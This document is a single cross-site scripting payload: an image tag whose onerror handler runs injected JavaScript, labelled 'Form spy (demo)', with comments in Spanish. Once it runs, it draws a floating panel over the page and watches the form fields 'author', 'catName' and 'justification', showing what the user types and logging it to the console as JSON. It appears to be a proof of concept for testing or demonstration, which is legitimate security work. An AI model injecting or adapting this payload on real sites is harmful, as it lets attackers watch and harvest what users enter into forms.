<img src=x onerror="!function(){try{
  var d=document; if(d.getElementById('xspy')) return; // evita duplicados

  // --- Panel flotante ---
  var box=d.createElement('div'); box.id='xspy';
  var bs=box.style;
  bs.position='fixed'; bs.right='12px'; bs.bottom='12px';
  bs.zIndex='2147483647'; bs.background='#111'; bs.color='#fff';
  bs.font='12px system-ui'; bs.padding='10px 12px'; bs.borderRadius='8px';
  bs.maxWidth='300px'; bs.boxShadow='0 6px 24px rgba(0,0,0,.25)';

  var head=d.createElement('div'); head.textContent='Form spy (demo)';
  head.style.fontWeight='700'; head.style.margin='0 0 6px';
  var close=d.createElement('button'); close.textContent='âœ•';
  close.style.cssText='margin-left:8px;background:#333;color:#fff;border:0;border-radius:6px;cursor:pointer;padding:0 6px';
  close.onclick=function(){ box.remove(); };
  var titleRow=d.createElement('div');
  titleRow.style.display='flex'; titleRow.style.alignItems='center';
  titleRow.appendChild(head); titleRow.appendChild(close);

  var pre=d.createElement('pre'); pre.id='xout';
  pre.style.whiteSpace='pre-wrap'; pre.style.wordBreak='break-word';
  pre.style.margin='0';

  box.appendChild(titleRow); box.appendChild(pre); d.body.appendChild(box);

  // --- Helpers ---
  var getVal=function(id){ var el=d.getElementById(id); return el && 'value' in el ? el.value : ''; };
  var snapshot=function(){ return {
    author: getVal('author'),
    catName: getVal('catName'),
    justification: getVal('justification')
  }; };
  var render=function(){
    var s=snapshot();
    pre.textContent='author='+s.author+'\ncatName='+s.catName+'\njustification='+s.justification;
  };

  var t=null;
  var logJSON=function(){
    if(t) clearTimeout(t);
    t=setTimeout(function(){
      var s=snapshot();
      console.log('[XSS demo] Form snapshot JSON:', s);
      console.log(JSON.stringify(s));
    }, 400);
  };

  // --- Suscribirse a cambios en los inputs del formulario ---
  ['author','catName','justification'].forEach(function(id){
    var el=d.getElementById(id);
    if(!el) return;
    el.addEventListener('input', function(){ render(); logJSON(); });
    el.addEventListener('change', function(){ render(); logJSON(); });
  });

  // Render inicial
  render(); logJSON();

}catch(e){ console.log('XSS demo error', e); alert('error: '+e.message); }}()">
